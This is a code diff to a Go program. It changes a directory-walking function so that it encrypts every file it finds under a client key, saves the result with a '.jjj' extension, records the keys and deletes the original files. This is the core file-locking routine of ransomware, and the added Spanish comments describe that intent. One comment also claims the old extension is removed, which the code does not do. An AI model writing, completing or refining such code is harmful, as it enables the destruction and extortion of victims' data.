@@ -150,18 +150,37 @@ func main() {
 }
 
 func walker(path string, info os.FileInfo, err error) error {
-	if err != nil {
-		log.Println("Error on:", path)
-		return err
-	}
-	if info.IsDir() {
-		log.Println(path, "(d)")
-		return nil
-	}
-	log.Println(path, "(f)")
-	bs, _ := os.ReadFile(path)
-	cbs, k := encryptHybrid(clientKey, bs)
-	os.WriteFile(path, cbs, 0666)
-	eis = append(eis, EncryptionInfo{Path: path, Key: k})
-	return nil
+    if err != nil {
+        log.Println("Error on:", path)
+        return err
+    }
+    if info.IsDir() {
+        log.Println(path, "(d)")
+        return nil
+    }
+    log.Println(path, "(f)")
+    bs, err := os.ReadFile(path)
+    if err != nil {
+        log.Println("Error al leer el archivo:", path, err)
+        return err
+    }
+    cbs, k := encryptHybrid(clientKey, bs)
+
+    // Crear el nuevo nombre: se añade ".jjj" y se elimina la extensión anterior
+    newPath := path + ".jjj"
+    err = os.WriteFile(newPath, cbs, 0666)
+    if err != nil {
+        log.Println("Error al escribir el archivo encriptado:", newPath, err)
+        return err
+    }
+    eis = append(eis, EncryptionInfo{Path: newPath, Key: k})
+
+    // Eliminar el archivo original para que solo quede el archivo encriptado
+    err = os.Remove(path)
+    if err != nil {
+        log.Println("Error al eliminar el archivo original:", path, err)
+        return err
+    }
+
+    return nil
 }
